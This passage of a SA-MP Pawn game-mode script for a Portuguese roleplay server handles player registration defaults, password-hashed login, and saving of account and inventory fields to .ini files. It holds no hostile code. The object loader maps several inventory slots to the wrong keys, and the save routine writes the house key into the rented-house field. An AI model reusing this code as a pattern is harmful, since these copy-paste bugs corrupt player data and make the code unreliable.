	pInfo[playerid][TempoViciado] = DOF2_GetInt(ficheiro, "TempoViciado");
	pInfo[playerid][ADesentoxicar] = DOF2_GetInt(ficheiro, "ADesentoxicar");
	pInfo[playerid][NumeroTelemovel] = DOF2_GetInt(ficheiro, "NumeroTelemovel");
	pInfo[playerid][Rede] = DOF2_GetInt(ficheiro, "Rede");
	pInfo[playerid][Saldo] = DOF2_GetInt(ficheiro, "Saldo");
	pInfo[playerid][TutFalhado] = DOF2_GetInt(ficheiro, "TutFalhado");
	pInfo[playerid][LicPesca] = DOF2_GetInt(ficheiro, "LicPesca");
	pInfo[playerid][Colete] = DOF2_GetInt(ficheiro, "Colete");
	pInfo[playerid][Suspeito] = DOF2_GetInt(ficheiro, "Suspeito");
	pInfo[playerid][VezesSuspeito] = DOF2_GetInt(ficheiro, "VezesSuspeito");
	pInfo[playerid][VezesPreso] = DOF2_GetInt(ficheiro, "VezesPreso");
	
    format(ficheiro, sizeof(ficheiro), "PCRP/Objetos/%s.ini", name);
    
    DOF2_CreateFile(ficheiro);
    
    DOF2_SetInt(ficheiro, "Mala", 0);
    DOF2_SetInt(ficheiro, "Mochila", 1);
    DOF2_SetInt(ficheiro, "Arma1Mala", 0);
    DOF2_SetInt(ficheiro, "Ammo1Mala", 0);
    DOF2_SetInt(ficheiro, "Arma2Mala", 0);
    DOF2_SetInt(ficheiro, "Ammo2Mala", 0);
    DOF2_SetInt(ficheiro, "Arma3Mala", 0);
    DOF2_SetInt(ficheiro, "Ammo3Mala", 0);
    DOF2_SetInt(ficheiro, "Arma4Mala", 0);
    DOF2_SetInt(ficheiro, "Ammo4Mala", 0);
    DOF2_SetInt(ficheiro, "Telemovel", 0);
    DOF2_SetInt(ficheiro, "o_2054", 0);
    DOF2_SetInt(ficheiro, "o_18639", 0);
    DOF2_SetInt(ficheiro, "o_18943", 0);
    DOF2_SetInt(ficheiro, "o_2053", 0);
    DOF2_SetInt(ficheiro, "o_2052", 0);
    DOF2_SetInt(ficheiro, "o_19160", 0);
    DOF2_SetInt(ficheiro, "o_18940", 0);
    DOF2_SetInt(ficheiro, "o_18941", 0);
    DOF2_SetInt(ficheiro, "o_19011", 0);
    DOF2_SetInt(ficheiro, "o_19006", 0);
    DOF2_SetInt(ficheiro, "o_19027", 0);
    DOF2_SetInt(ficheiro, "o_19007", 0);
    DOF2_SetInt(ficheiro, "o_19008", 0);
    DOF2_SetInt(ficheiro, "o_19009", 0);
    DOF2_SetInt(ficheiro, "o_19010", 0);
    DOF2_SetInt(ficheiro, "o_19011", 0);
    DOF2_SetInt(ficheiro, "o_19012", 0);
    DOF2_SetInt(ficheiro, "o_19013", 0);
    DOF2_SetInt(ficheiro, "o_19014", 0);
    DOF2_SetInt(ficheiro, "o_19015", 0);
    DOF2_SetInt(ficheiro, "o_19016", 0);
    DOF2_SetInt(ficheiro, "o_19017", 0);
    DOF2_SetInt(ficheiro, "o_19018", 0);
    DOF2_SetInt(ficheiro, "Radio", 0);
    DOF2_SetInt(ficheiro, "Arma1Mochila", 0);
    DOF2_SetInt(ficheiro, "Ammo1Mochila", 0);
    DOF2_SetInt(ficheiro, "Arma2Mochila", 0);
    DOF2_SetInt(ficheiro, "Ammo2Mochila", 0);
    DOF2_SetInt(ficheiro, "Arma3Mochila", 0);
    DOF2_SetInt(ficheiro, "Ammo3Mochila", 0);
    DOF2_SetInt(ficheiro, "Arma4Mochila", 0);
    DOF2_SetInt(ficheiro, "Ammo4Mochila", 0);
    DOF2_SetInt(ficheiro, "Bidom", 0);
    DOF2_SetInt(ficheiro, "ListaTel", 0);
    DOF2_SetInt(ficheiro, "Mascara", 0);
    DOF2_SetInt(ficheiro, "Corda", 0);
    DOF2_SetInt(ficheiro, "Venda", 0);
    DOF2_SetInt(ficheiro, "Capacete", 0);
    DOF2_SetInt(ficheiro, "CanaDePesca", 0);
    DOF2_SetInt(ficheiro, "WalkieTalkie", 0);
    DOF2_SetInt(ficheiro, "WalkieTalkieFreq", 0);
    DOF2_SetInt(ficheiro, "Peixe_Corvina", 0);
    DOF2_SetInt(ficheiro, "Peixe_Congro", 0);
    DOF2_SetInt(ficheiro, "Peixe_Robalo", 0);
    DOF2_SetInt(ficheiro, "Peixe_Sargo", 0);
    DOF2_SetInt(ficheiro, "Peixe_Goraz", 0);
    DOF2_SetInt(ficheiro, "Peixe_Cavala", 0);
    DOF2_SetInt(ficheiro, "Peixe_Dourada", 0);
    DOF2_SetInt(ficheiro, "Peixe_Espada", 0);
    DOF2_SetInt(ficheiro, "Isco", 0);
    DOF2_SetInt(ficheiro, "Colete", 0);
    
    DOF2_SaveFile();
    
    format(ficheiro, sizeof(ficheiro), "PCRP/Amigos/%s.ini", name);
    
    DOF2_CreateFile(ficheiro);
    DOF2_SaveFile();
    
    pInfo[playerid][Vida] = 50;
    
	return 1;
}

public LogarJogador(playerid, password[])
{
	new ficheiro[64];
 	new pw[256], cryptedpw[256];
  	strmid(pw, password, 0, 256);

	new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof(name));
    
    SHA256_PassHash(pw, PW_SALT, cryptedpw, sizeof cryptedpw);
    
   	format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", name);
	format(pInfo[playerid][Key], 256, "%s", DOF2_GetString(ficheiro, "Key"));
 	
 	if(BadLoginCounter[playerid] >= 3)
 	{
		return KickPlayer(playerid, "Doge", "Errou a password 3 vezes");
 	}
 	
    if(!strcmp(pInfo[playerid][Key], cryptedpw) && strlen(cryptedpw) != 0)
    {
	    pInfo[playerid][Key] = cryptedpw;
	    pInfo[playerid][Banido] = DOF2_GetInt(ficheiro, "Banido");
	    pInfo[playerid][UID] = DOF2_GetInt(ficheiro, "UID");
	    pInfo[playerid][Vida] = DOF2_GetFloat(ficheiro, "Vida");
	    pInfo[playerid][Level] = DOF2_GetInt(ficheiro, "Level");
	    pInfo[playerid][Skin] = DOF2_GetInt(ficheiro, "Skin");
	    pInfo[playerid][Admin] = DOF2_GetInt(ficheiro, "Admin");
	    pInfo[playerid][Emprego] = DOF2_GetInt(ficheiro, "Emprego");
	    pInfo[playerid][Faction] = DOF2_GetInt(ficheiro, "Faction");
	    pInfo[playerid][FactionRank] = DOF2_GetInt(ficheiro, "FactionRank");
	    pInfo[playerid][AJCounter] = DOF2_GetInt(ficheiro, "AJCounter");
	    format(pInfo[playerid][RegDay], 32, "%s", DOF2_GetString(ficheiro, "RegDay"));
	    pInfo[playerid][Origem] = DOF2_GetInt(ficheiro, "Origem");
	    pInfo[playerid][Sexo] = DOF2_GetInt(ficheiro, "Sexo");
	    pInfo[playerid][Idade] = DOF2_GetInt(ficheiro, "Idade");
 	   	pInfo[playerid][Registado] = DOF2_GetInt(ficheiro, "Registado");
 	   	pInfo[playerid][TutFeito] = DOF2_GetInt(ficheiro, "TutFeito");
 	   	pInfo[playerid][Money] = DOF2_GetInt(ficheiro, "Money");
		pInfo[playerid][Bank] = DOF2_GetInt(ficheiro, "Bank");
		pInfo[playerid][ChaveBiz] = DOF2_GetInt(ficheiro, "ChaveBiz");
		pInfo[playerid][ChaveCasa] = DOF2_GetInt(ficheiro, "ChaveCasa");
		pInfo[playerid][ChaveCasaAlugada] = DOF2_GetInt(ficheiro, "ChaveCasaAlugada");
 	   	pInfo[playerid][ChaveCarro1] = DOF2_GetInt(ficheiro, "ChaveCarro1");
 	   	pInfo[playerid][ChaveCarro2] = DOF2_GetInt(ficheiro, "ChaveCarro2");
  	   	pInfo[playerid][ChaveCarro3] = DOF2_GetInt(ficheiro, "ChaveCarro3");
 	   	pInfo[playerid][ChaveCarro4] = DOF2_GetInt(ficheiro, "ChaveCarro4");
   	   	pInfo[playerid][ChaveCarroEmp1] = DOF2_GetInt(ficheiro, "ChaveCarroEmp1");
 	   	pInfo[playerid][ChaveCarroEmp2] = DOF2_GetInt(ficheiro, "ChaveCarroEmp2");
  	   	pInfo[playerid][ChaveCarroEmp3] = DOF2_GetInt(ficheiro, "ChaveCarroEmp3");
 	   	pInfo[playerid][ChaveCarroEmp4] = DOF2_GetInt(ficheiro, "ChaveCarroEmp4");
 	   	pInfo[playerid][Minutos] = DOF2_GetInt(ficheiro, "Minutos");
 	   	pInfo[playerid][PreDrogas] = DOF2_GetInt(ficheiro, "PreDrogas");
 	   	pInfo[playerid][PreMateriais] = DOF2_GetInt(ficheiro, "PreMateriais");
 	   	pInfo[playerid][Drogas] = DOF2_GetInt(ficheiro, "Drogas");
 	   	pInfo[playerid][Materiais] = DOF2_GetInt(ficheiro, "Materiais");
 	   	pInfo[playerid][CartaLig] = DOF2_GetInt(ficheiro, "CartaLig");
 	   	pInfo[playerid][CartaMota] = DOF2_GetInt(ficheiro, "CartaMota");
 	   	pInfo[playerid][CartaPesados] = DOF2_GetInt(ficheiro, "CartaPesados");
 	   	pInfo[playerid][CartaBarco] = DOF2_GetInt(ficheiro, "CartaBarco");
 	   	pInfo[playerid][LicArmas] = DOF2_GetInt(ficheiro, "LicArmas");
 	   	pInfo[playerid][Multas] = DOF2_GetInt(ficheiro, "Multas");
 	   	pInfo[playerid][Jailed] = DOF2_GetInt(ficheiro, "Jailed");
 	   	pInfo[playerid][JailTime] = DOF2_GetInt(ficheiro, "JailTime");
 	   	pInfo[playerid][Preso] = DOF2_GetInt(ficheiro, "Preso");
 	   	pInfo[playerid][PresoTempo] = DOF2_GetInt(ficheiro, "PresoTempo");
 	   	pInfo[playerid][XP] = DOF2_GetInt(ficheiro, "XP");
 	   	pInfo[playerid][Meses] = DOF2_GetInt(ficheiro, "Meses");
 	   	pInfo[playerid][Doenca] = DOF2_GetInt(ficheiro, "Doenca");
 	   	pInfo[playerid][Medicamentos] = DOF2_GetInt(ficheiro, "Medicamentos");
 	   	pInfo[playerid][MedicamentosTomados] = DOF2_GetInt(ficheiro, "MedicamentosTomados");
 	   	pInfo[playerid][ReceitaMedica] = DOF2_GetInt(ficheiro, "ReceitaMedica");
 	   	pInfo[playerid][Morto] = DOF2_GetInt(ficheiro, "Morto");
 	   	pInfo[playerid][MorteX] = DOF2_GetFloat(ficheiro, "MorteX");
 	   	pInfo[playerid][MorteY] = DOF2_GetFloat(ficheiro, "MorteY");
 	   	pInfo[playerid][MorteZ] = DOF2_GetFloat(ficheiro, "MorteZ");
 	   	pInfo[playerid][MorteVirtualWorld] = DOF2_GetInt(ficheiro, "MorteVirtualWorld");
 	   	pInfo[playerid][MorteInterior] = DOF2_GetInt(ficheiro, "MorteInterior");
 	   	pInfo[playerid][Euro1] = DOF2_GetInt(ficheiro, "Euro1");
 	   	pInfo[playerid][Euro2] = DOF2_GetInt(ficheiro, "Euro2");
 	   	pInfo[playerid][Euro3] = DOF2_GetInt(ficheiro, "Euro3");
 	   	pInfo[playerid][Euro4] = DOF2_GetInt(ficheiro, "Euro4");
 	   	pInfo[playerid][Euro5] = DOF2_GetInt(ficheiro, "Euro5");
 	   	pInfo[playerid][BilheteEuro] = DOF2_GetInt(ficheiro, "BilheteEuro");
 	   	pInfo[playerid][Estrela1] = DOF2_GetInt(ficheiro, "Estrela1");
 	   	pInfo[playerid][Estrela2] = DOF2_GetInt(ficheiro, "Estrela2");
 	   	pInfo[playerid][Codigo] = DOF2_GetInt(ficheiro, "Codigo");
 	   	pInfo[playerid][Rotas] = DOF2_GetInt(ficheiro, "Rotas");
 	   	pInfo[playerid][EmpregoNivel] = DOF2_GetInt(ficheiro, "EmpregoNivel");
 	   	pInfo[playerid][TempoRota] = DOF2_GetInt(ficheiro, "TempoRota");
 	   	pInfo[playerid][CC] = DOF2_GetInt(ficheiro, "CC");
 	   	pInfo[playerid][Seguradora] = DOF2_GetInt(ficheiro, "Seguradora");
 	   	pInfo[playerid][MensalidadeSeguradora] = DOF2_GetInt(ficheiro, "MensalidadeSeguradora");
 	   	pInfo[playerid][SeguradoraCount] = DOF2_GetInt(ficheiro, "SeguradoraCount");
 	   	pInfo[playerid][SeguradoraPayCount] = DOF2_GetInt(ficheiro, "SeguradoraPayCount");
 	   	pInfo[playerid][Golds] = DOF2_GetInt(ficheiro, "Golds");
 	   	pInfo[playerid][Viciado] = DOF2_GetInt(ficheiro, "Viciado");
 	   	pInfo[playerid][TempoViciado] = DOF2_GetInt(ficheiro, "TempoViciado");
 	   	pInfo[playerid][ADesentoxicar] = DOF2_GetInt(ficheiro, "ADesentoxicar");
  	   	pInfo[playerid][NumeroTelemovel] = DOF2_GetInt(ficheiro, "NumeroTelemovel");
 	   	pInfo[playerid][Rede] = DOF2_GetInt(ficheiro, "Rede");
 	   	pInfo[playerid][Saldo] = DOF2_GetInt(ficheiro, "Saldo");
 	   	pInfo[playerid][TutFalhado] = DOF2_GetInt(ficheiro, "TutFalhado");
 	   	pInfo[playerid][LicPesca] = DOF2_GetInt(ficheiro, "LicPesca");
 	   	pInfo[playerid][Colete] = DOF2_GetInt(ficheiro, "Colete");
 	   	pInfo[playerid][SpawnX] = DOF2_GetFloat(ficheiro, "SpawnX");
 	   	pInfo[playerid][SpawnY] = DOF2_GetFloat(ficheiro, "SpawnY");
 	   	pInfo[playerid][SpawnZ] = DOF2_GetFloat(ficheiro, "SpawnZ");
 	   	pInfo[playerid][SpawnVirtualWorld] = DOF2_GetInt(ficheiro, "SpawnVirtualWorld");
 	   	pInfo[playerid][SpawnInterior] = DOF2_GetInt(ficheiro, "SpawnInterior");
 	   	pInfo[playerid][Suspeito] = DOF2_GetInt(ficheiro, "Suspeito");
  	   	pInfo[playerid][VezesSuspeito] = DOF2_GetInt(ficheiro, "VezesSuspeito");
 	   	pInfo[playerid][VezesPreso] = DOF2_GetInt(ficheiro, "VezesPreso");
 	   	

 	   	format(ficheiro, sizeof(ficheiro), "PCRP/Objetos/%s.ini", name);
 	   	
 	   	pObjects[playerid][Mala] = DOF2_GetInt(ficheiro, "Mala");
 	   	pObjects[playerid][Mochila] = DOF2_GetInt(ficheiro, "Mochila");
 	   	pObjects[playerid][Arma1Mala] = DOF2_GetInt(ficheiro, "Arma1Mala");
 	   	pObjects[playerid][Ammo1Mala] = DOF2_GetInt(ficheiro, "Ammo1Mala");
 	   	pObjects[playerid][Arma2Mala] = DOF2_GetInt(ficheiro, "Arma2Mala");
 	   	pObjects[playerid][Ammo2Mala] = DOF2_GetInt(ficheiro, "Ammo2Mala");
 	   	pObjects[playerid][Arma3Mala] = DOF2_GetInt(ficheiro, "Arma3Mala");
 	   	pObjects[playerid][Ammo3Mala] = DOF2_GetInt(ficheiro, "Ammo3Mala");
 	   	pObjects[playerid][Arma4Mala] = DOF2_GetInt(ficheiro, "Arma4Mala");
 	   	pObjects[playerid][Ammo4Mala] = DOF2_GetInt(ficheiro, "Ammo4Mala");
 	   	pObjects[playerid][Telemovel] = DOF2_GetInt(ficheiro, "Telemovel");
 	   	pObjects[playerid][o_2054] = DOF2_GetInt(ficheiro, "o_2054");
 	   	pObjects[playerid][o_18639] = DOF2_GetInt(ficheiro, "o_18639");
 	   	pObjects[playerid][o_18943] = DOF2_GetInt(ficheiro, "o_18943");
 	   	pObjects[playerid][o_2053] = DOF2_GetInt(ficheiro, "o_2053");
 	   	pObjects[playerid][o_2052] = DOF2_GetInt(ficheiro, "o_2052");
 	   	pObjects[playerid][o_19160] = DOF2_GetInt(ficheiro, "o_19160");
 	   	pObjects[playerid][o_18940] = DOF2_GetInt(ficheiro, "o_18940");
 	   	pObjects[playerid][o_18941] = DOF2_GetInt(ficheiro, "o_18941");
 	   	pObjects[playerid][o_19011] = DOF2_GetInt(ficheiro, "o_19011");
 	   	pObjects[playerid][o_19006] = DOF2_GetInt(ficheiro, "o_19006");
 	   	pObjects[playerid][o_19027] = DOF2_GetInt(ficheiro, "o_19027");
 	   	pObjects[playerid][o_19160] = DOF2_GetInt(ficheiro, "o_19007");
 	   	pObjects[playerid][o_18940] = DOF2_GetInt(ficheiro, "o_19008");
 	   	pObjects[playerid][o_18941] = DOF2_GetInt(ficheiro, "o_19009");
 	   	pObjects[playerid][o_19011] = DOF2_GetInt(ficheiro, "o_19010");
 	   	pObjects[playerid][o_19006] = DOF2_GetInt(ficheiro, "o_19011");
 	   	pObjects[playerid][o_19027] = DOF2_GetInt(ficheiro, "o_19012");
 	   	pObjects[playerid][o_19160] = DOF2_GetInt(ficheiro, "o_19013");
 	   	pObjects[playerid][o_18940] = DOF2_GetInt(ficheiro, "o_19014");
 	   	pObjects[playerid][o_18941] = DOF2_GetInt(ficheiro, "o_19015");
 	   	pObjects[playerid][o_19011] = DOF2_GetInt(ficheiro, "o_19016");
 	   	pObjects[playerid][o_19006] = DOF2_GetInt(ficheiro, "o_19017");
 	   	pObjects[playerid][o_19027] = DOF2_GetInt(ficheiro, "o_19018");
 	   	pObjects[playerid][Radio] = DOF2_GetInt(ficheiro, "Radio");
 	   	pObjects[playerid][Arma1Mochila] = DOF2_GetInt(ficheiro, "Arma1Mochila");
 	   	pObjects[playerid][Ammo1Mochila] = DOF2_GetInt(ficheiro, "Ammo1Mochila");
 	   	pObjects[playerid][Arma2Mochila] = DOF2_GetInt(ficheiro, "Arma2Mochila");
 	   	pObjects[playerid][Ammo2Mochila] = DOF2_GetInt(ficheiro, "Ammo2Mochila");
 	   	pObjects[playerid][Arma3Mochila] = DOF2_GetInt(ficheiro, "Arma3Mochila");
 	   	pObjects[playerid][Ammo3Mochila] = DOF2_GetInt(ficheiro, "Ammo3Mochila");
 	   	pObjects[playerid][Arma4Mochila] = DOF2_GetInt(ficheiro, "Arma4Mochila");
 	   	pObjects[playerid][Ammo4Mochila] = DOF2_GetInt(ficheiro, "Ammo4Mochila");
 	   	pObjects[playerid][Bidom] = DOF2_GetInt(ficheiro, "Bidom");
 	   	pObjects[playerid][ListaTel] = DOF2_GetInt(ficheiro, "ListaTel");
 	   	pObjects[playerid][Mascara] = DOF2_GetInt(ficheiro, "Mascara");
 	   	pObjects[playerid][Corda] = DOF2_GetInt(ficheiro, "Corda");
 	   	pObjects[playerid][Venda] = DOF2_GetInt(ficheiro, "Venda");
 	   	pObjects[playerid][Capacete] = DOF2_GetInt(ficheiro, "Capacete");
 	   	pObjects[playerid][CanaDePesca] = DOF2_GetInt(ficheiro, "CanaDePesca");
		pObjects[playerid][WalkieTalkie] = DOF2_GetInt(ficheiro, "WalkieTalkie");
		pObjects[playerid][WalkieTalkieFreq] = DOF2_GetInt(ficheiro, "WalkieTalkieFreq");
 	   	pObjects[playerid][Peixe_Corvina] = DOF2_GetInt(ficheiro, "Peixe_Corvina");
 	   	pObjects[playerid][Peixe_Congro] = DOF2_GetInt(ficheiro, "Peixe_Congro");
		pObjects[playerid][Peixe_Robalo] = DOF2_GetInt(ficheiro, "Peixe_Robalo");
		pObjects[playerid][Peixe_Sargo] = DOF2_GetInt(ficheiro, "Peixe_Sargo");
 	   	pObjects[playerid][Peixe_Goraz] = DOF2_GetInt(ficheiro, "Peixe_Goraz");
 	   	pObjects[playerid][Peixe_Cavala] = DOF2_GetInt(ficheiro, "Peixe_Cavala");
		pObjects[playerid][Peixe_Dourada] = DOF2_GetInt(ficheiro, "Peixe_Dourada");
		pObjects[playerid][Peixe_Espada] = DOF2_GetInt(ficheiro, "Peixe_Espada");
		pObjects[playerid][Isco] = DOF2_GetInt(ficheiro, "Isco");

 	   	if(pInfo[playerid][Banido] == 1) return KickPlayer(playerid, "Doge", "Tens a conta banida");
 	   	
 	   	Logged[playerid] = true;
 	   	SpawnarJogador(playerid);
    }
    else
    {
   		new sdialog[512];
		new string[128];
		
		BadLoginCounter[playerid]++;
    	
    	format(string, sizeof(string), "{FF9900}[ {FFFFFF}PORTUGAL FUN MAPS {FF9900}]"); strcat(sdialog,string);
    	format(string, sizeof(string), "\n\n{FFFFFF}Nome da tua conta: {FF9900}%s", GetPlayerNameEx(playerid)); strcat(sdialog,string);
    	format(string, sizeof(string), "\n{FFFFFF}Status: {FF9900}Registada"); strcat(sdialog,string);
    	format(string, sizeof(string), "\n{FFFFFF}Tentativas: {AA3333}%d{FF9900}/3", BadLoginCounter[playerid]); strcat(sdialog,string);
    	
        ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "LOGIN", sdialog, "Login", "Sair");
    }
	return 1;
}

public GuardarJogador(playerid)
{
	if(Logged[playerid] == false) return 1;
	
	new ficheiro[64];

	new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof(name));
    
	new Float:health, Float:armour;
	GetPlayerHealth(playerid, health);
	GetPlayerArmour(playerid, armour);
	
    format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", name);
    
    DOF2_SetInt(ficheiro, "Banido", pInfo[playerid][Banido]);
    DOF2_SetInt(ficheiro, "UID", pInfo[playerid][UID]);
    DOF2_SetFloat(ficheiro, "Vida", health);
    DOF2_SetInt(ficheiro, "Level", pInfo[playerid][Level]);
    DOF2_SetInt(ficheiro, "Skin", pInfo[playerid][Skin]);
    DOF2_SetInt(ficheiro, "Admin", pInfo[playerid][Admin]);
    DOF2_SetInt(ficheiro, "Emprego", pInfo[playerid][Emprego]);
    DOF2_SetInt(ficheiro, "Faction", pInfo[playerid][Faction]);
    DOF2_SetInt(ficheiro, "FactionRank", pInfo[playerid][FactionRank]);
    DOF2_SetInt(ficheiro, "AJCounter", pInfo[playerid][AJCounter]);
    DOF2_SetInt(ficheiro, "Origem", pInfo[playerid][Origem]);
    DOF2_SetInt(ficheiro, "Sexo", pInfo[playerid][Sexo]);
    DOF2_SetInt(ficheiro, "Idade", pInfo[playerid][Idade]);
    DOF2_SetInt(ficheiro, "Registado", pInfo[playerid][Registado]);
    DOF2_SetInt(ficheiro, "TutFeito", pInfo[playerid][TutFeito]);
    DOF2_SetInt(ficheiro, "Money", GetPlayerMoneyEx(playerid));
    DOF2_SetInt(ficheiro, "Bank", pInfo[playerid][Bank]);
    DOF2_SetInt(ficheiro, "ChaveBiz", pInfo[playerid][ChaveBiz]);
    DOF2_SetInt(ficheiro, "ChaveCasa", pInfo[playerid][ChaveCasa]);
    DOF2_SetInt(ficheiro, "ChaveCasaAlugada", pInfo[playerid][ChaveCasa]);
    DOF2_SetInt(ficheiro, "ChaveCarro1", pInfo[playerid][ChaveCarro1]);
    DOF2_SetInt(ficheiro, "ChaveCarro2", pInfo[playerid][ChaveCarro2]);
    DOF2_SetInt(ficheiro, "ChaveCarro3", pInfo[playerid][ChaveCarro3]);
    DOF2_SetInt(ficheiro, "ChaveCarro4", pInfo[playerid][ChaveCarro4]);
    DOF2_SetInt(ficheiro, "ChaveCarroEmp1", pInfo[playerid][ChaveCarroEmp1]);
    DOF2_SetInt(ficheiro, "ChaveCarroEmp2", pInfo[playerid][ChaveCarroEmp2]);
    DOF2_SetInt(ficheiro, "ChaveCarroEmp3", pInfo[playerid][ChaveCarroEmp3]);
    DOF2_SetInt(ficheiro, "ChaveCarroEmp4", pInfo[playerid][ChaveCarroEmp4]);
    DOF2_SetInt(ficheiro, "Minutos", pInfo[playerid][Minutos]);
    DOF2_SetInt(ficheiro, "PreDrogas", pInfo[playerid][PreDrogas]);
    DOF2_SetInt(ficheiro, "PreMateriais", pInfo[playerid][PreMateriais]);
    DOF2_SetInt(ficheiro, "Drogas", pInfo[playerid][Drogas]);
    DOF2_SetInt(ficheiro, "Materiais", pInfo[playerid][Materiais]);
    DOF2_SetInt(ficheiro, "CartaLig", pInfo[playerid][CartaLig]);
    DOF2_SetInt(ficheiro, "CartaMota", pInfo[playerid][CartaMota]);
    DOF2_SetInt(ficheiro, "CartaPesados", pInfo[playerid][CartaPesados]);
    DOF2_SetInt(ficheiro, "CartaBarco", pInfo[playerid][CartaBarco]);
    DOF2_SetInt(ficheiro, "LicArmas", pInfo[playerid][LicArmas]);
    DOF2_SetInt(ficheiro, "Multas", pInfo[playerid][Multas]);
    DOF2_SetInt(ficheiro, "Jailed", pInfo[playerid][Jailed]);
    DOF2_SetInt(ficheiro, "JailTime", pInfo[playerid][JailTime]);
    DOF2_SetInt(ficheiro, "Preso", pInfo[playerid][Preso]);
    DOF2_SetInt(ficheiro, "PresoTempo", pInfo[playerid][PresoTempo]);
    DOF2_SetInt(ficheiro, "XP", pInfo[playerid][XP]);
    DOF2_SetInt(ficheiro, "Meses", pInfo[playerid][Meses]);
    DOF2_SetInt(ficheiro, "Doenca", pInfo[playerid][Doenca]);
    DOF2_SetInt(ficheiro, "Medicamentos", pInfo[playerid][Medicamentos]);
    DOF2_SetInt(ficheiro, "MedicamentosTomados", pInfo[playerid][MedicamentosTomados]);
    DOF2_SetInt(ficheiro, "ReceitaMedica", pInfo[playerid][ReceitaMedica]);
    DOF2_SetInt(ficheiro, "Euro1", pInfo[playerid][Euro1]);
    DOF2_SetInt(ficheiro, "Euro2", pInfo[playerid][Euro2]);
    DOF2_SetInt(ficheiro, "Euro3", pInfo[playerid][Euro3]);
    DOF2_SetInt(ficheiro, "Euro4", pInfo[playerid][Euro4]);
    DOF2_SetInt(ficheiro, "Euro5", pInfo[playerid][Euro5]);
    DOF2_SetInt(ficheiro, "BilheteEuro", pInfo[playerid][BilheteEuro]);
    DOF2_SetInt(ficheiro, "Estrela1", pInfo[playerid][Estrela1]);
    DOF2_SetInt(ficheiro, "Codigo", pInfo[playerid][Codigo]);
    DOF2_SetInt(ficheiro, "Rotas", pInfo[playerid][Rotas]);
    DOF2_SetInt(ficheiro, "EmpregoNivel", pInfo[playerid][EmpregoNivel]);
    DOF2_SetInt(ficheiro, "TempoRota", pInfo[playerid][TempoRota]);
    DOF2_SetInt(ficheiro, "CC", pInfo[playerid][CC]);
    DOF2_SetInt(ficheiro, "Seguradora", pInfo[playerid][Seguradora]);
    DOF2_SetInt(ficheiro, "MensalidadeSeguradora", pInfo[playerid][MensalidadeSeguradora]);
    DOF2_SetInt(ficheiro, "SeguradoraCount", pInfo[playerid][SeguradoraCount]);
    DOF2_SetInt(ficheiro, "SeguradoraPayCount", pInfo[playerid][SeguradoraPayCount]);
    DOF2_SetInt(ficheiro, "Golds", pInfo[playerid][Golds]);
    DOF2_SetInt(ficheiro, "Viciado", pInfo[playerid][Viciado]);
    DOF2_SetInt(ficheiro, "TempoViciado", pInfo[playerid][TempoViciado]);
    DOF2_SetInt(ficheiro, "ADesentoxicar", pInfo[playerid][ADesentoxicar]);
    DOF2_SetInt(ficheiro, "NumeroTelemovel", pInfo[playerid][NumeroTelemovel]);
    DOF2_SetInt(ficheiro, "Rede", pInfo[playerid][Rede]);
    DOF2_SetInt(ficheiro, "Saldo", pInfo[playerid][Saldo]);
    DOF2_SetInt(ficheiro, "TutFalhado", pInfo[playerid][TutFalhado]);
    DOF2_SetInt(ficheiro, "LicPesca", pInfo[playerid][LicPesca]);
    DOF2_SetFloat(ficheiro, "Colete", armour);
	DOF2_SetFloat(ficheiro, "MorteX", pInfo[playerid][MorteX]);
	DOF2_SetFloat(ficheiro, "MorteY", pInfo[playerid][MorteY]);
	DOF2_SetFloat(ficheiro, "MorteZ", pInfo[playerid][MorteZ]);
	DOF2_SetInt(ficheiro, "MorteVirtualWorld", pInfo[playerid][MorteVirtualWorld]);
	DOF2_SetInt(ficheiro, "MorteInterior", pInfo[playerid][MorteInterior]);
	DOF2_SetFloat(ficheiro, "SpawnX", pInfo[playerid][SpawnX]);
	DOF2_SetFloat(ficheiro, "SpawnY", pInfo[playerid][SpawnY]);
	DOF2_SetFloat(ficheiro, "SpawnZ", pInfo[playerid][SpawnZ]);
	DOF2_SetInt(ficheiro, "SpawnVirtualWorld", pInfo[playerid][SpawnVirtualWorld]);
	DOF2_SetInt(ficheiro, "SpawnInterior", pInfo[playerid][SpawnInterior]);
	DOF2_SetInt(ficheiro, "Suspeito", pInfo[playerid][Suspeito]);
	DOF2_SetInt(ficheiro, "VezesSuspeito", pInfo[playerid][VezesSuspeito]);
	DOF2_SetInt(ficheiro, "VezesPreso", pInfo[playerid][VezesPreso]);
	

    DOF2_SaveFile();
    
    format(ficheiro, sizeof(ficheiro), "PCRP/Objetos/%s.ini", name);
    
    DOF2_SetInt(ficheiro, "Mala", pObjects[playerid][Mala]);
    DOF2_SetInt(ficheiro, "Mochila", pObjects[playerid][Mochila]);
    DOF2_SetInt(ficheiro, "Arma1Mala", pObjects[playerid][Arma1Mala]);
    DOF2_SetInt(ficheiro, "Ammo1Mala", pObjects[playerid][Ammo1Mala]);
    DOF2_SetInt(ficheiro, "Arma2Mala", pObjects[playerid][Arma2Mala]);
    DOF2_SetInt(ficheiro, "Ammo2Mala", pObjects[playerid][Ammo2Mala]);
    DOF2_SetInt(ficheiro, "Arma3Mala", pObjects[playerid][Arma3Mala]);
    DOF2_SetInt(ficheiro, "Ammo3Mala", pObjects[playerid][Ammo3Mala]);
    DOF2_SetInt(ficheiro, "Arma4Mala", pObjects[playerid][Arma4Mala]);
    DOF2_SetInt(ficheiro, "Ammo4Mala", pObjects[playerid][Ammo4Mala]);
    DOF2_SetInt(ficheiro, "Telemovel", pObjects[playerid][Telemovel]);
    DOF2_SetInt(ficheiro, "o_2054", pObjects[playerid][o_2054]);
    DOF2_SetInt(ficheiro, "o_18639", pObjects[playerid][o_18639]);
    DOF2_SetInt(ficheiro, "o_18943", pObjects[playerid][o_18943]);
    DOF2_SetInt(ficheiro, "o_2053", pObjects[playerid][o_2053]);
    DOF2_SetInt(ficheiro, "o_2052", pObjects[playerid][o_2052]);
    DOF2_SetInt(ficheiro, "o_19160", pObjects[playerid][o_19160]);
    DOF2_SetInt(ficheiro, "o_18940", pObjects[playerid][o_18940]);
    DOF2_SetInt(ficheiro, "o_18941", pObjects[playerid][o_18941]);
    DOF2_SetInt(ficheiro, "o_19011", pObjects[playerid][o_19011]);
    DOF2_SetInt(ficheiro, "o_19006", pObjects[playerid][o_19006]);
